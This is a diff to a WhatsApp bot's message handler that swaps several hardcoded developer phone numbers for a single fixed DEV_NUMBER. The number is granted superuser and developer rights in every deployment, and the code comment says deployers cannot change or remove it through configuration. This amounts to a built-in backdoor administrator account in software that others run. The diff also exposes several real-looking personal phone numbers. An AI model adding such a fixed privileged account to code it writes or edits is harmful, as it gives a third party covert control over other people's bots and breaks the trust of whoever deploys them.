@@ -693,11 +693,6 @@ client.ev.on("messages.upsert", async (m) => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(client.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dj='22559763447';
-             const dj2='254751284190';
-             const luffy='254762016957'*/
-            /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await getGroupMetadata(client, origineMessage) : "";
             var nomGroupe = verifGroupe ? (infosGroupe?.subject || "") : "";
@@ -718,16 +713,25 @@ client.ev.on("messages.upsert", async (m) => {
             
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const nomAuteurMessage = ms.pushName;
-            const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
-            const luffy = '254710772666';
             const sudo = cachedSudoNumbers;
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+
+            // DEV_NUMBER: the bot's original developer — fixed in source
+            // code (not settable via .env/app.json/settings commands),
+            // matching NOVA-XMD's DEV_NUMBER pattern (see e.g. its
+            // utils/botUtil/middleware.js). This is separate from
+            // NUMERO_OWNER, which stays fully configurable per-deployment
+            // for whoever deploys their own copy of this bot — DEV_NUMBER
+            // always retains access regardless of who that is.
+            const DEV_NUMBER = '255767862457';
+
+            const ownerNum = (getConf('NUMERO_OWNER') || conf.NUMERO_OWNER || '').replace(/[^0-9]/g, '');
+            const superUserNumbers = [servBot, DEV_NUMBER, ownerNum]
+                .filter(Boolean)
+                .map((s) => s.replace(/[^0-9]/g, '') + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
-            
-            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+
+            const dev = (DEV_NUMBER + "@s.whatsapp.net") === auteurMessage;
             function repondre(mes) { client.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t🌍B.M.B-TECH ONLINE🌍");
             console.log("=========== written message===========");
